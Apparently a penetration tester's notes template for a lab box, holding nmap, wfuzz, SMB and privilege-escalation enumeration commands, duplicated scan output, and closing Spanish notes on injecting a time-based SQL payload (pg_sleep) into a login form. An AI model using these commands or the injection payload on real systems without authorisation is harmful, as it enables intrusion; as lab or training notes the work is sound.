<font color="green">=======================================================================</font>
# Initial Information<font color="red">:</font> 
<font color="blue">=======================================================================</font>

Name | IP Address | Tech Stack | Web Server | DB
-- | -- | -- | -- | --
-- | -- | -- | -- | --


<hr>

### Loot - Credentials<font color="red">:</font> 

**User** | **Password** | **System**
-- | -- | --
-- | -- | --

<hr>

<font color="green">=======================================================================</font>
# Enumeration
<font color="green">=======================================================================</font>

##### <font color="red">[+]</font> SERVICES<font color="red">:</font> 
- HTTP - <font color="red">XX</font> 

##### <font color="red">[+]</font> NMAP<font color="red">:</font> 

List all ports.
```bash
sudo nmap $IP -p- -sS --min-rate 5000 -Pn -n -v

PORT   STATE SERVICE
```

Services and version on identified open ports.
```bash 
nmap $IP -p XXX -sCV -oN enum/nmap -v

PORT   STATE SERVICE VERSION
```


<hr>

##### <font color="red">[+]</font> WFUZZ

###### FILES: <font color="red">/</font>(Web Root)
```bash
wfuzz -c --hc 404 --hh 0 -u http://$IP/FUZZ  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 200

# Results:
=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================
```

###### DIRECTORIES: <font color="red">/</font>(Web Root)
```bash
wfuzz -c --hc 404 --hh 0 -u http://$IP/FUZZ/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 200

Results:
=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================
```

<hr>

<font color="green">=======================================================================</font>
# Post Exploitation
<font color="green">=======================================================================</font>

##### <font color="red">[+]</font> PrivEsc Notes<font color="red">:</font> 


##### <font color="red">[+]</font> System Enumeration<font color="red">:</font> 

- **Host**:
- **Compilation version and architecture**:


##### <font color="red">[+]</font> List Interesting Directories<font color="red">:</font> 

- **/tmp**:
- **/opt**:
- **/var/tmp**:
- **/dev/shm**:
- **/var/backups/**:
- **/var/mail**:

##### <font color="red">[+]</font> S/GUIDS<font color="red">:</font> 

- SUIDs:
```bash
find / -perm -u=s -type f 2>/dev/null
```

##### <font color="red">[+]</font> ROOT Processes (ps) <font color="red">:</font> 
```bash
ps aux | grep -i root --color
```

##### <font color="red">[+]</font> Local Network Services (netstat/ss)<font color="red">:</font> 
```bash
# (or ss if netstat not available)
netstat -tunlp | grep '127.0.0.1' --color=auto
netstat -antup | grep '127.0.0.1' --color=auto
```

##### <font color="red">[+]</font> I/O - PsPy<font color="red">:</font> 
```bash
```PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
 PORT      STATE SERVICE       VERSION
 21/tcp    open  ftp           FileZilla ftpd
 | ftp-syst: 
 |_  SYST: UNIX emulated by FileZilla
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
 22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
 | ssh-hostkey: 
 |   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
 |   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
 |_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Debian))
 |_http-server-header: Apache/2.4.38 (Debian)
 |_ssl-date: TLS randomness does not represent time
 |_http-title: MegaLogistics
 | ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=Mega
 inceName=Some-State/countryName=GR
 | Not valid before: 2020-02-18T17:45:56
 |_Not valid after:  2021-02-17T17:45:56
 | tls-alpn: 
 |_  http/1.1
 445/tcp   open  microsoft-ds?
 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 49664/tcp open  msrpc         Microsoft Windows RPC
21/tcp    open  ftp           FileZilla ftpd
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
|   date: 2024-03-28T09:22:19
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Debian))
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
 crackmapexec smb 10.10.10.236
SMB         10.10.10.236    445    TOOLBOX          [*] Windows 10.0 Build 17763 x64 (name:TOOLBOX) (domain:Toolbox) (signing:False) (SMBv1:False)
 smbmap -L 10.10.10.236 -N
smbclient -L 10.10.10.236 -N
session setup failed: NT_STATUS_ACCESS_DENIED
 clipc
 openssl s_client -connect $ip:443
 sudo nano /etc/hosts
10.10.10.236 admin.megalogistic.com
 firefox https://admin.megalogistic.com/

abrimos bursuipt
mando algo en contrasena y usuario

cambio responder a 
␍
username=';select pg_sleep(10);-- -&password='

si tarda 10 segundos es vulnerable
